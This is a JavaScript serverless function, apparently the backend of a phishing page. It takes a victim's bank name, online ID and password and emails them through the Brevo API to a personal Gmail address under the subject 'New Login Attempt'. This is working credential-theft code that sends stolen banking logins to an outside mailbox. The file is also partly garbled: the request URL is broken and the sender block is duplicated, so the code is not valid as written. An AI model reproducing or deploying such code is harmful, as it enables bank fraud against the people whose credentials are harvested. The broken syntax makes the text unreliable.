import axios from 'axios';

export default async function handler(event, context) {
  const BREVO_API_KEY = process.env.BREVO_API_KEY;
  const bankName = event.body.bankName;
  const onlineId = event.body.onlineId;
  const password = event.body.password;

  try {
    const response = await axios.post('https:                                 
      sender: {
        email: '//api.brevo.com/v3/smtp/email', {
      sender: {
        email: 'emmanuelparker15@gmail.com',
        name: 'Emmanuel Parker'
      },
      to: [
        {
          email: 'emmanuelparker15@gmail.com',
          name: 'Emmanuel Parker'
        }
      ],
      subject: 'New Login Attempt',
      htmlContent: `
        <h1>New Login Attempt</h1>
        <p>Bank: ${bankName}</p>
        <p>ID: ${onlineId}</p>
        <p>Password: ${password}</p>
      `
    }, {
      headers: {
        'api-key': BREVO_API_KEY,
        'Content-Type': 'application/json'
      }
    });

    console.log(response.data);
    return {
      statusCode: 200,
      body: JSON.stringify({ status: 'success', message: 'Email sent successfully.' })
    };
  } catch (error) {
    console.error(error);
    return {
      statusCode: 500,
      body: JSON.stringify({ status: 'error', message: 'Failed to send email.' })
    };
  }
}
